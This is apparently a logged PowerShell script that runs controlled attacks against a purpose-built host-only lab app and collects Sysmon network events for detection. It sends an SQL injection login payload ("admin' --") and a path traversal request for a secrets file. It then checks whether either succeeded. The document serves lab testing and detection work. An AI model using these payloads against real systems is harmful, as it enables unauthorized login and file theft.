ScriptBlockText:
$ErrorActionPreference = 'Stop'
$start = Get-Date
$base = 'http://192.168.56.1:8085'
$normal = Invoke-RestMethod -Uri "$base/login?username=viewer&password=wrong" -Method Get
$injectedUser = [Uri]::EscapeDataString("admin' --")
$injection = Invoke-RestMethod -Uri "$base/login?username=$injectedUser&password=wrong" -Method Get
$traversalName = [Uri]::EscapeDataString('../secrets/demo-secret.txt')
$traversal = Invoke-RestMethod -Uri "$base/files?name=$traversalName" -Method Get
Start-Sleep -Seconds 2
$network = foreach ($event in Get-WinEvent -FilterHashtable @{ LogName='Microsoft-Windows-Sysmon/Operational'; Id=3; StartTime=$start } -ErrorAction SilentlyContinue) {
  [xml]$xml = $event.ToXml(); $fields = @{}
  foreach ($item in $xml.Event.EventData.Data) { $fields[$item.Name] = [string]$item.'#text' }
  if ($fields.DestinationIp -eq '192.168.56.1' -and $fields.DestinationPort -eq '8085') {
    [ordered]@{ event_id=3; record_id=$event.RecordId; timestamp_utc=$event.TimeCreated.ToUniversalTime().ToString('o'); image=$fields.Image; user=$fields.User; destination_ip=$fields.DestinationIp; destination_port=$fields.DestinationPort; protocol=$fields.Protocol }
  }
}
[ordered]@{
  scenario='controlled attacks against purpose-built host-only application'
  target='192.168.56.1:8085'
  normal_login_authenticated=[bool]$normal.authenticated
  injection_authenticated=[bool]$injection.authenticated
  injection_role=$injection.role
  traversal_returned_synthetic_marker=([string]$traversal.content -like '*SYNTHETIC-LAB-DATA*')
  sysmon_network_events=@($network)
} | ConvertTo-Json -Depth 6
